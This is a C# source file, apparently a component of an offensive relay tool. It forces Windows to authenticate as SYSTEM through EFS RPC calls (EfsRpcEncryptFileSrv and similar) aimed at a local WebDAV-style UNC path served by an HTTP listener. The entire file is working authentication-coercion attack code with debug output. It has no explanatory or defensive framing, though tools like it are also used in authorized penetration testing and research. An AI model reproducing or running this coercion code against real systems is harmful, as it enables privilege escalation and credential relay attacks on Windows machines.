using Httprelayserver.EfsTrigger;

namespace Httprelayserver.AuthTrigger
{
    public static class EfsTrigger
    {

        public enum ApiCall
        {
            EfsRpcEncryptFileSrv,
            EfsRpcDecryptFileSrv,
            EfsRpcQueryRecoveryAgents,
            EfsRpcQueryUsersOnFile,
            EfsRpcRemoveUsersFromFile
        }

        public static bool Trigger(int port, ApiCall apiCall = ApiCall.EfsRpcEncryptFileSrv)
        {
            Console.WriteLine("[+] Coercing System Authentication");
            Console.WriteLine($"[DEBUG] Selected API call: {apiCall}");
            Console.WriteLine($"[DEBUG] Target port: {port}");
            Console.WriteLine($"[DEBUG] OS Version: {Environment.OSVersion}");
            Console.WriteLine($"[DEBUG] OS Build: {Environment.OSVersion.Version.Build}");
            Console.WriteLine($"[DEBUG] Architecture: {(nint.Size == 8 ? "x64" : "x86")}");

            int result;
            string target = "127.0.0.1";
            string listener = "localhost";
            string uncPath;

            Console.WriteLine($"[DEBUG] Machine name (used in UNC path): {listener}");

            var Efs = new Efs();
            IntPtr hHandle = IntPtr.Zero;

            try
            {
                switch (apiCall)
                {
                    case ApiCall.EfsRpcEncryptFileSrv:
                        uncPath = $"\\\\{listener}@{port}/asdf\\test\\Settings.ini";
                        Console.WriteLine($"[DEBUG] Calling EfsRpcEncryptFileSrv(target={target}, path={uncPath})");
                        result = Efs.EfsRpcEncryptFileSrv(target, uncPath);
                        Console.WriteLine($"[DEBUG] EfsRpcEncryptFileSrv returned: {result} (0x{result:x8})");
                        break;

                    case ApiCall.EfsRpcDecryptFileSrv:
                        uncPath = $"\\\\{listener}@{port}/asdf\\test\\Settings.ini";
                        Console.WriteLine($"[DEBUG] Calling EfsRpcDecryptFileSrv(target={target}, path={uncPath})");
                        result = Efs.EfsRpcDecryptFileSrv(target, uncPath, 0);
                        Console.WriteLine($"[DEBUG] EfsRpcDecryptFileSrv returned: {result} (0x{result:x8})");
                        break;

                    case ApiCall.EfsRpcQueryRecoveryAgents:
                        uncPath = $"\\\\{listener}@{port}/asdf\\test\\Settings.ini";
                        Console.WriteLine($"[DEBUG] Calling EfsRpcQueryRecoveryAgents(target={target}, path={uncPath})");
                        result = Efs.EfsRpcQueryRecoveryAgents(target, uncPath, out hHandle);
                        Console.WriteLine($"[DEBUG] EfsRpcQueryRecoveryAgents returned: {result} (0x{result:x8}), handle=0x{hHandle:x}");
                        break;

                    case ApiCall.EfsRpcQueryUsersOnFile:
                        uncPath = $"\\\\{listener}@{port}/asdf\\test\\Settings.ini";
                        Console.WriteLine($"[DEBUG] Calling EfsRpcQueryUsersOnFile(target={target}, path={uncPath})");
                        result = Efs.EfsRpcQueryUsersOnFile(target, uncPath, out hHandle);
                        Console.WriteLine($"[DEBUG] EfsRpcQueryUsersOnFile returned: {result} (0x{result:x8}), handle=0x{hHandle:x}");
                        break;

                    case ApiCall.EfsRpcRemoveUsersFromFile:
                        uncPath = $"\\\\{listener}@{port}/asdf\\test\\Settings.ini";
                        Console.WriteLine($"[DEBUG] Calling EfsRpcRemoveUsersFromFile(target={target}, path={uncPath})");
                        result = Efs.EfsRpcRemoveUsersFromFile(target, uncPath, out hHandle);
                        Console.WriteLine($"[DEBUG] EfsRpcRemoveUsersFromFile returned: {result} (0x{result:x8}), handle=0x{hHandle:x}");
                        break;

                    default:
                        uncPath = $"\\\\{listener}@{port}/asdf\\test\\Settings.ini";
                        Console.WriteLine($"[DEBUG] Calling EfsRpcOpenFileRaw(target={target}, path={uncPath}, flags=0)");
                        result = Efs.EfsRpcOpenFileRaw(target, out hHandle, uncPath, 0);
                        Console.WriteLine($"[DEBUG] EfsRpcOpenFileRaw returned: {result} (0x{result:x8}), handle=0x{hHandle:x}");
                        break;
                }
                Console.WriteLine($"[DEBUG] EFS coercion call completed with result: {result} (0x{result:x8})");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[DEBUG] EFS coercion threw exception: {ex.GetType().Name}: {ex.Message}");
                Console.WriteLine($"[DEBUG] HRESULT: 0x{ex.HResult:x8}");
                Console.WriteLine($"[DEBUG] Stack trace: {ex.StackTrace}");
                if (ex.InnerException != null)
                    Console.WriteLine($"[DEBUG] Inner exception: {ex.InnerException.GetType().Name}: {ex.InnerException.Message}");
                Console.WriteLine(ex);
                return false;
            }
            return true;
        }

        /// <summary>
        /// Trigger EFS authentication coercion asynchronously
        /// </summary>
        public static async Task<bool> TriggerAsync(int httpPort, int delayMs = 2000)
        {
            return await Task.Run(() =>
            {
                if (delayMs > 0)
                {
                    Console.WriteLine($"[*] Waiting {delayMs}ms for HTTP server to start...");
                    Thread.Sleep(delayMs);
                }
                return Trigger(httpPort);
            });
        }
    }
}
